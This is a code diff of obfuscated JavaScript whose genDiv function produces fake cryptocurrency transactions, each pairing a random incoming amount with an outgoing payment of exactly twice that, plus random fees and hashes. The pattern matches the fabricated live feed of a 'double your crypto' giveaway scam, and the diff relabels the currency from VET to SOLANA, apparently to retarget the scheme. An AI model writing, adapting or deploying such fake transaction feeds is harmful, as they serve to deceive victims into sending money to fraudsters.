@@ -136,7 +136,7 @@ function genDiv() {
   let _0xe480xe = "IN";
   let _0xe480xf = valet.substring(0, 10);
   let valueSend = getRandomArbitrary(1250, 50000);
-  let _0xe480x10 = valueSend + " VET";
+  let _0xe480x10 = valueSend + " SOLANA";
   let _0xe480x11 = (Math["random"]() * 0.009 * getRundomMnogitel() +
     0.0001 * getRundomMnogitel())["toFixed"](6);
   let _0xe480x12 = GenerateHash(10);
@@ -146,7 +146,7 @@ function genDiv() {
   let _0xe480x15 = _0xe480xf.slice(0, 10) + "...";
   let _0xe480x16 = "OUT";
   let _0xe480x17 = _0xe480xd;
-  let _0xe480x18 = valueSend * 2 + " VET";
+  let _0xe480x18 = valueSend * 2 + " SOLANA";
   let _0xe480x19 = (Math["random"]() * 0.009 * getRundomMnogitel() +
     0.0001 * getRundomMnogitel())["toFixed"](8);
   _0xe480x9 = _0xe480x9["replace"]("{t1}", _0xe480x12);
